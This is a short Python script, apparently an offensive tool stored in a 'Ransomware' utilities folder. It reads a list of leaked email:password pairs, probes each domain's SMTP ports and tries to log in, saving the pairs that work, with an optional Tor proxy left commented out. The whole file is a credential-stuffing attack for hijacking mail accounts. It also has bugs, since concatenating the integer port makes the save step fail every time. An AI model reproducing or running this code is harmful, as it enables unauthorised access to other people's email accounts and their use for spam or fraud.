import smtplib
import requests
import socket
import socks

# socks.setdefaultproxy(socks.SOCKS5, 'localhost', 9050)
# socks.wrapmodule(smtplib)

def openPort(server, ports):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)
    
    for port in ports:
        try:
            s.connect((server, port))
            s.shutdown(2)
            return port
        except Exception:
            continue
    return 0

blocked_domains = ["gmail", "yahoo", "hotmail", "live", "msn"]
ports = [587, 25, 465]
with open('C:\\Users\\Francesco\\Desktop\\Ransomware\\Utils\\combo.txt', "r", encoding="utf-8") as combo_file:
    for line in combo_file.readlines():
        line = line.rstrip('\n')
        try:
            username = line.split(":")[0]
            password = line.split(":")[1]
            smtp_server = "smtp." + username.split("@")[1]     
        except Exception:
            continue

        if any(domain in smtp_server for domain in blocked_domains):
            continue

        port = openPort(smtp_server, ports)
        if port == 0:
            blocked_domains.append(smtp_server)
            continue

        try:       
            with smtplib.SMTP(smtp_server, port, timeout=5) as server:
                server.login(username, password)

            succeed = smtp_server + '|' + port + '|' + username + "|" + password
            print(succeed)
            with open('C:\\Users\\Francesco\\Desktop\\Ransomware\\Utils\\smtp_server.csv', "w") as result:
                result.writelines(succeed)

        except socket.timeout:
            print(smtp_server + ' time out')
            blocked_domains.append(smtp_server)
            break
        except Exception as e:
            print(smtp_server + ' ' + str(e))